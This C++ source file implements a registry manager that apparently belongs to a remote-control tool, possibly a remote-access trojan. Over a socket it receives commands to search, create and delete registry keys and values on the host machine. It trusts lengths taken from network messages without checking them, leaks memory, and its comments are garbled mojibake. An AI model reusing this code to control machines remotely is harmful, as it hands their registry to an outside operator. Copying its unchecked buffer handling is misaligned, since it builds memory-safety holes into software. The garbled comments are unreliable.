// RegManager.cpp: implementation of the CRegManager class.
//
//////////////////////////////////////////////////////////////////////
#include "RegManager.h"
#include "RegeditOpt.h"
#include "Registry.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


CRegManager::CRegManager(CClientSocket *pClient) : CManager(pClient)
{
     //TOKEN_REGEDIT
	 BYTE bToken=TOKEN_REGEDIT;
		  Send((BYTE*)&bToken,1);
}
CRegManager::~CRegManager()
{

}

//û��ִ�гɹ�
void CRegManager::SendNO()
{
      BYTE bToken=TOKEN_REG_NO;
        Send(&bToken, sizeof(BYTE));
}
//ִ�гɹ�
void CRegManager::SendOK()
{
    BYTE bToken=TOKEN_REG_OK;
    Send(&bToken, sizeof(BYTE));
}

void CRegManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0]){
	case COMMAND_REG_FIND:             //������
        if(nSize>=3){
		   Find(lpBuffer[1],(char*)(lpBuffer+2));
		}else{
		   Find(lpBuffer[1],NULL);
		}
		break;
	case COMMAND_REG_DELPATH:           //ɾ����
         DelPath((char*)lpBuffer+1);
		break;
	case COMMAND_REG_CREATEPATH:         //������
        CreatePath((char*)lpBuffer+1);
		break;
	case COMMAND_REG_DELKEY:            //ɾ����
        DelKey((char*)lpBuffer+1);
		break;
	case COMMAND_REG_CREATKEY:          //���� �Ӽ�
           CreateKey((char*)lpBuffer+1);
		break;
	default:
		break;
	}
}
//��ѯ
void CRegManager::Find(char bToken,char* path)
{
   RegeditOpt  reg(bToken);
   if(path!=NULL){
        reg.SetPath(path);
   }
   char *tmp= reg.FindPath();
   if(tmp!=NULL){
     Send((LPBYTE)tmp, LocalSize(tmp));
	  LocalFree(tmp);
   }else{
      SendNO();
   }
   char* tmpd=reg.FindKey();

    if(tmpd!=NULL){
     Send((LPBYTE)tmpd, LocalSize(tmpd));
	  LocalFree(tmpd);
	}else{
	     SendNO();
	}
}

//ɾ��ָ����
void CRegManager::DelPath(char *buf)
{
    CRegistry reg(buf[0]);
	if(reg.DeleteKey(buf+1)){
	   // BYTE bToken=TOKEN_REG_OK;
       /// Send(&bToken, sizeof(BYTE));
		SendOK();
	}else{
	   SendNO();
	}
}
//������
void CRegManager::CreatePath(char *buf)
{

     CRegistry reg(buf[0]);
	if(reg.CreateKey(buf+1)){
	   SendOK();
	}else{
	    SendNO();
	}

}
//ɾ����
void CRegManager::DelKey(char *buf)
{
    CRegistry reg(buf[0]);
	REGMSG msg;
	memcpy((void*)&msg,buf+1,sizeof(msg));
	char* tmp=buf+1+sizeof(msg);
    if(msg.valsize>0)
	{   
		if(msg.size>0){                //�ȴ�����
	           char* path=new char[msg.size+1];
		       ZeroMemory(path,msg.size+1);
			   memcpy(path,tmp,msg.size);
			   if(!reg.Open(path)){
			             SendNO();  
						 return;
			   }
			   tmp+=msg.size;
		}
        
		char* key=new char[msg.valsize+1];
		ZeroMemory(key,msg.valsize+1);
		memcpy(key,tmp,msg.valsize);
		if(reg.DeleteValue(key)){
		    SendOK();
		}else
			SendNO();


	}
}
//�����Ӽ�
void CRegManager::CreateKey(char *buf)
{
	switch(buf[0]){
	   case MREG_SZ:        //�ַ�
          TestSTR(buf+1);
		   break;
	   case MREG_DWORD:       //DWORD
           TestDWORD(buf+1);
		   break;
	   case MREG_EXPAND_SZ:   //����չ�ַ�
		   TestEXSTR(buf+1);
		   break;
	   default:
		   break;
	
	} 
}
//�ִ�ֵ
void CRegManager::TestSTR(char *buf)
{

	CRegistry reg(buf[0]);
	REGMSG msg;
	memcpy((void*)&msg,buf+1,sizeof(msg));
	char* tmp=buf+1+sizeof(msg);
	 if(msg.valsize>0&&msg.size>0)
	{   
		if(msg.count>0){                //�ȴ�����
	           char* path=new char[msg.count+1];
		       ZeroMemory(path,msg.count+1);
			   memcpy(path,tmp,msg.count);
			   if(!reg.Open(path)){
			             SendNO();  
						 return;
			   }
			   tmp+=msg.count;
			   delete[] path;
		}
		char *key=new char[msg.size+1];
		ZeroMemory(key,msg.size+1);
		memcpy(key,tmp,msg.size);
        tmp+=msg.size;
		if(reg.Write(key,tmp)){
		    SendOK();
		}else{
		    SendNO();
		}
		delete[] key;
		


	}

     
}
DWORD atod(char* ch){
     int len=strlen(ch);
	 DWORD d=0;
	 for(int i=0;i<len;i++){
		 int t=ch[i]-48;   //��λ�ϵ�����
	      if(ch[i]>57||ch[i]<48){          //��������
		       return d;
		  }
          d*=10;
		  d+=t;
	 }
	 return d;

}
//DWORD ֵ
void CRegManager::TestDWORD(char *buf)
{

   	CRegistry reg(buf[0]);
	REGMSG msg;
	memcpy((void*)&msg,buf+1,sizeof(msg));
	char* tmp=buf+1+sizeof(msg);
	 if(msg.valsize>0&&msg.size>0)
	{   
		if(msg.count>0){                //�ȴ�����
	           char* path=new char[msg.count+1];
		       ZeroMemory(path,msg.count+1);
			   memcpy(path,tmp,msg.count);
			   if(!reg.Open(path)){
			             SendNO();  
						 return;
			   }
			   tmp+=msg.count;
			   delete[] path;
		}
		char *key=new char[msg.size+1];
		ZeroMemory(key,msg.size+1);
		memcpy(key,tmp,msg.size);
        tmp+=msg.size;
		DWORD d=atod(tmp);               //��Ϊdword
		if(reg.Write(key,d)){
		    SendOK();
		}else{
		    SendNO();
		}
		delete[] key;
		


	}
}
//����չ����
void CRegManager::TestEXSTR(char *buf)
{
    CRegistry reg(buf[0]);
	REGMSG msg;
	memcpy((void*)&msg,buf+1,sizeof(msg));
	char* tmp=buf+1+sizeof(msg);
	 if(msg.valsize>0&&msg.size>0)
	{   
		if(msg.count>0){                //�ȴ�����
	           char* path=new char[msg.count+1];
		       ZeroMemory(path,msg.count+1);
			   memcpy(path,tmp,msg.count);
			   if(!reg.Open(path)){
			             SendNO();  
						 return;
			   }
			   tmp+=msg.count;
			   delete[] path;
		}
		char *key=new char[msg.size+1];
		ZeroMemory(key,msg.size+1);
		memcpy(key,tmp,msg.size);
        tmp+=msg.size;
		if(reg.WriteBuf(key,tmp)){
		    SendOK();
		}else{
		    SendNO();
		}
		delete[] key;
	}
}
